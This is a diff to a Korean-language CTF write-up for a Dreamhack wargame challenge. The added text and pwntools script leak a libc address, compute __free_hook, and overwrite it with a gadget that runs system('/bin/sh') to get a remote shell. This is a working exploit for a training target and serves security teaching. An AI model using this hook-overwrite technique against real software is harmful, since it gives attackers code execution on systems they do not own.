@@ -134,3 +134,32 @@ PIE:      No PIE (0x400000)
 
 이제 공격을 진행해보면 입력을 free hook 변수 주소값과 덮어쓸 코드에 있는 system 함수의 주소를 넣어주면 될 것이다.
 
+여기서 system 함수 주소는 edi에 binsh 문자열을 넣어주는 주소인 0x400a11을 사용해야 한다.
+
+<br>
+
+```python
+from pwn import *
+
+p = remote('host3.dreamhack.games',10450)
+libc = ELF('./libc.so.6')
+
+p.recvuntil(b'stdout: ')
+
+stdout = int(p.recvn(14),16)
+libc_base = stdout - libc.symbols['_IO_2_1_stdout_']
+free_hook = libc_base + libc.symbols['__free_hook']
+binsh_system = 0x400a11 # NO PIE
+
+print("@ stdout : ",hex(stdout))
+print("@ libc_base: ", hex(libc_base))
+print("@ free_hook: ", hex(free_hook))
+
+p.sendlineafter(b'Size: ', b'16')
+
+payload = p64(free_hook) + p64(binsh_system)
+p.sendlineafter(b'Data: ', payload)
+
+p.interactive()
+```
+
